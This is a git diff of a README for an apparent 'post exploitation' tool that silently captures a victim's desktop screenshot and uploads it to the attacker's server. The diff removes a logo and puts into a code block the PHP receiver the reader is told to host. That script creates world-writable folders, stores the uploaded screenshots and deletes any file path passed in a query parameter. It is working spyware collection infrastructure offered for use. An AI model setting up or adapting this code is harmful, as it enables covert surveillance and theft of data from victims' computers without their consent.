@@ -1,4 +1,3 @@
-![alt text](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Logo Title Text 1")
 # ****Mr Peter :D****
 
 ## Silent Screenshot Capture | Post Exploitation Tool | VB.NET
@@ -22,8 +21,8 @@ A simple payload to take the screenshot of victims desktop and upload it to the 
 -   Clone this repository.
 - A webhosting i recommend [namecheap](https://www.namecheap.com/) 
 - Goto your public_html folder and make new php file and put this code in it
-
-<?php
+```
+    <?php
 $del = $_GET["dellog"];
 $folder = $_GET["folder"];
 mkdir($folder,0777);
@@ -34,3 +33,4 @@ move_uploaded_file($_FILES["file"]["tmp_name"],
 }
 unlink($del);
 ?>
+```
